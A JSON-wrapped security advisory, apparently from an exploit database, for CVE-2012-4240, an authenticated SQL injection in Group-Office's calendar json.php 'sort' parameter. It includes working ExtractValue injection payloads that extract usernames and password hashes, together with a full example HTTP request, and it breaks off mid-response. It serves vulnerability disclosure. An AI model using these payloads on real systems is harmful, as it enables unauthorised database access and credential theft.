{
    "text": "ecve : CVE-2012-4240 ， title : Group Office Calendar - '/calendar/json.php' SQL Injection - PHP webapps Exploit ， verified : Not Verified ， exploit_detail : /-------------------------------------\\ ，  | Group-Office Calendar SQL Injection |  ， \\-------------------------------------/ ， Summary ， Versions of Group-Office ( a web app for online collaboration ) prior to ， 4.0.90 are subject to a SQL injection vulnerability located in the calendar ， module. A PHP file , used to serve data in the JSON format , does not ， sufficiently sanitise a user-supplied parameter injected into the ORDER BY ， part of an SQL query. An attacker can leverage this flaw to extract ， information from the database via SQL errors. ， CVE number : CVE-2012-4240 ， Impact : High ， Vendor homepage :  ， Vendor notified : 19/07/2012 ， Credit : Chris Cooper and Joseph Sheridan ， Homepage :  ， This advisory is posted at :  ， Affected Products ， ======== ======== ， Confirmed in Group-Office community 4.0.71 , 4.0.73 and 4.0.88. Other ， versions may also be affected. ， Details ， A 'sort' parameter on the page /modules/calendar/json.php was found to be ， subject to a SQL injection vulnerability. It was possible to inject ， arbitrary SQL statements into an ORDER BY clause , retrieving information ， from the database via an error message. The attacker must be authenticated ， as a valid user in order for the attack to be successful. ， Injecting the following SQL code into the 'sort' parameter will trigger the ， vulnerability , retrieving the first user's username. Changing 'username' to ， 'password' retrieves their hashed password. For version 4.0.71 :  ， ExtractValue ( 1 , CONCAT ( 0x5c ,  ( SELECT username FROM go_users LIMIT 1 )  )  )  ， Or for versions 4.0.73 and 4.0.88 :  ， id` , ExtractValue ( 1 , CONCAT ( 0x5c ,  ( SELECT username FROM go_users LIMIT 1 )  )  )  #  ， Example Request ( version 4.0.71 )  :  ， +-------------------------------- ， POST /groupoffice/modules/calendar/json.php HTTP/1.1 ， Host : 127.0.0.1 ， Content-Type : application/x-www-form-urlencoded ; charset=UTF-8 ， Content-Length : 162 ， Cookie : groupoffice=tgocfuhoh7lrqo0mckfef4us04 ; GO_LANGUAGE=en_UK ， sort=ExtractValue ( 1 , CONCAT ( 0x5c ,  ( SELECT%20username%20FROM%20go_users%20LIMIT ， %201 )  )  ) &dir=ASC&task=writable_views&limit=20&security_token=pfi5lckw3r9qm64n ， adgb ， Example Response ( version 4.0.71 )  :  ， +--------------------------------- ， HTTP/1.1 200 OK ， Date : Fri , 20 Jul 2012 14 : 16 : 09 GMT ， Server : Apache ， Expires : Thu , 19 Nov 1981 08 : 52 : 00 GMT ， Cache-Control : no-store , no-cache , must-revalidate , post-check=0 ,  ， pre-check=0 ， Pragma : no-cache ， Content-Length : 397 ， Content-Type : ",
    "time": "2012-09-04"
}